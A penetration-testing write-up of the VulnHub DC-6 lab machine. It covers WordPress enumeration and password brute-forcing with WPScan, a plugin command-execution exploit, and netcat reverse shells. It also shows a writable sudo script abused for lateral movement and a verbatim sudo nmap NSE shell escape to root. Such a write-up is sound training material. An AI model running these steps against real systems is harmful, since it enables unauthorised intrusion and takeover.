# DC-BOX-6
<div align="center">

# `> DC-6_`

### `VULNHUB // PENETRATION TESTING WRITE-UP`

![Platform](https://img.shields.io/badge/PLATFORM-VULNHUB-6f42c1?style=for-the-badge)
![Target](https://img.shields.io/badge/TARGET-DC--6-21262d?style=for-the-badge)
![Status](https://img.shields.io/badge/STATUS-ROOTED-2ea44f?style=for-the-badge)

`WORDPRESS` • `ENUMERATION` • `EXPLOITATION` • `LINUX PRIVESC`

</div>

---

# `> 00 // OVERVIEW_`

DC-6 is an intentionally vulnerable machine from **VulnHub** that I completed as part of my hands-on offensive security practice.

This challenge involved **network enumeration, WordPress enumeration, credential discovery, vulnerable plugin exploitation, reverse shell access, lateral movement, and Linux privilege escalation**.

> [!NOTE]
> This write-up documents security testing performed in an intentionally vulnerable CTF environment for educational purposes.

---

# `> 01 // TARGET_DISCOVERY_`

The first step was identifying the target machine on the local network.

```bash
sudo -i
nmap -sN 192.168.56.0/24
```

The target was identified as:

```text
TARGET  →  192.168.56.117
```

The main exposed services were:

```text
[+] 22/tcp  → SSH
[+] 80/tcp  → HTTP
```

This indicated that the web application was the most interesting initial attack surface.

---

# `> 02 // HOST_CONFIGURATION_`

When I attempted to access the target directly through its IP address, the website did not load correctly.

The application expected the hostname:

```text
wordy
```

I added the hostname to `/etc/hosts`:

```bash
echo '192.168.56.117 wordy' | tee -a /etc/hosts
```

The website was then accessible through:

```text
http://wordy
```

Further inspection showed that the target was running **WordPress**.

---

# `> 03 // WEB_ENUMERATION_`

I started by checking common web resources:

```bash
curl http://wordy/robots.txt
```

I then performed additional enumeration using:

```bash
nikto -h http://wordy
```

and:

```bash
dirb http://wordy
```

The results mainly revealed standard WordPress-related resources, so I moved on to WordPress-specific enumeration.

---

# `> 04 // WORDPRESS_ENUMERATION_`

I used **WPScan** to enumerate WordPress users and plugins:

```bash
wpscan --url http://wordy -e u,p
```

The scan revealed multiple WordPress usernames.

I stored the discovered usernames inside:

```text
user.txt
```

### `STATUS`

```text
[+] WordPress detected
[+] Users enumerated
[+] Plugins investigated
```

---

# `> 05 // CREDENTIAL_DISCOVERY_`

The challenge provided a clue that could be used to reduce the size of the `rockyou.txt` wordlist.

I created a targeted password list:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

I checked the number of generated passwords:

```bash
wc -l passwords.txt
```

I then tested the discovered usernames using WPScan:

```bash
wpscan --url http://wordy -U user.txt -P passwords.txt
```

This resulted in valid credentials being discovered for:

```text
USER  → mark
```

I then authenticated to the WordPress dashboard through:

```text
http://wordy/wp-admin
```

---

# `> 06 // PLUGIN_EXPLOITATION_`

After accessing the WordPress dashboard, I investigated the installed functionality and identified the **Activity Monitor** plugin.

I searched the local Exploit-DB database for known vulnerabilities:

```bash
searchsploit activity monitor
```

A relevant exploit was identified.

I copied it to my working directory:

```bash
searchsploit -m php/webapps/45274.html
```

Then inspected the exploit:

```bash
cat 45274.html
```

The vulnerable functionality could be manipulated to achieve system command execution.

```text
WORDPRESS ACCESS
       │
       ▼
VULNERABLE PLUGIN
       │
       ▼
COMMAND EXECUTION
```

---

# `> 07 // INITIAL_SHELL_`

I intercepted the vulnerable request using **Burp Suite** and modified the request to establish a connection back to my Kali machine.

First, I started a Netcat listener:

```bash
sudo nc -nlvp 5555
```

After triggering the vulnerable request, a reverse shell was successfully received.

I upgraded the shell using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### `ACCESS_GRANTED`

```text
[+] Remote command execution
[+] Reverse connection established
[+] Interactive shell obtained
```

---

# `> 08 // LATERAL_MOVEMENT_`

After obtaining the initial shell, I began enumerating the local users and their files.

During enumeration of **Mark's files**, I discovered a to-do file containing credentials associated with another user:

```text
mark  ──────►  graham
```

Using the discovered credentials, I connected to the machine through SSH:

```bash
ssh graham@192.168.56.117
```

This provided a more stable shell as `graham`.

---

# `> 09 // SUDO_ENUMERATION_`

Once logged in as Graham, I checked the available sudo privileges:

```bash
sudo -l
```

The configuration revealed access involving:

```text
/home/jens/backups.sh
```

I inspected the script and its permissions:

```bash
ls -alh /home/jens/backups.sh
```

The script could be modified by Graham while being executed with **Jens's privileges**.

This created another privilege boundary that could be crossed.

```text
graham
   │
   │ writable privileged script
   ▼
 jens
```

---

# `> 10 // USER_ESCALATION_`

I first confirmed that Netcat was available:

```bash
which nc
```

A reverse-shell command was then added to the writable script.

On Kali, I started another listener:

```bash
sudo nc -nlvp 6666
```

Executing the script through the permitted sudo configuration resulted in a shell running as:

```text
jens
```

I then checked Jens's sudo permissions:

```bash
sudo -l
```

This revealed that Jens could execute:

```text
/usr/bin/nmap
```

with elevated privileges.

---

# `> 11 // ROOT_ESCALATION_`

The Nmap sudo configuration provided the final privilege-escalation path.

I created a temporary NSE script:

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

The script executed a shell through Nmap's elevated privileges.

I verified the resulting access:

```bash
whoami
```

```text
root
```

### `PRIVILEGE_CHAIN`

```text
WordPress
    │
    ▼
  mark
    │
    ▼
 graham
    │
    ▼
  jens
    │
    ▼
  ROOT
```

---

# `> 12 // FLAG_CAPTURED_`

After obtaining root access:

```bash
cd /root
ls -alh
```

The final flag was successfully obtained.

```text
┌─────────────────────────────────┐
│                                 │
│      ACCESS LEVEL : ROOT        │
│      MACHINE      : DC-6        │
│      STATUS       : ROOTED ✓    │
│                                 │
└─────────────────────────────────┘
```

---

# `> KEY_TAKEAWAYS_`

DC-6 gave me practical experience with:

`NMAP` • `WORDPRESS` • `WPSCAN` • `NIKTO` • `SEARCHSPLOIT`

`BURP SUITE` • `NETCAT` • `SSH` • `SUDO` • `NMAP NSE`

Key areas I practiced included:

- 🔎 Network and service enumeration
- 🌐 WordPress enumeration
- 🔑 Targeted credential attacks
- 🧩 Vulnerable plugin identification
- 💻 Command execution
- 🔄 Reverse shell handling
- 👤 Linux user enumeration
- 🔀 Lateral movement
- ⚠️ Writable privileged scripts
- ⬆️ Sudo misconfiguration exploitation
- 🚩 Root privilege escalation

> [!TIP]
> The main lesson from DC-6 was how credentials, file permissions, and sudo misconfigurations can be chained together to move through multiple user accounts before ultimately reaching root.

---

<div align="center">

### `> DC-6 // ROOTED_`

**`mark → graham → jens → root`**

`[ WRITE-UP COMPLETE ]`



</div>
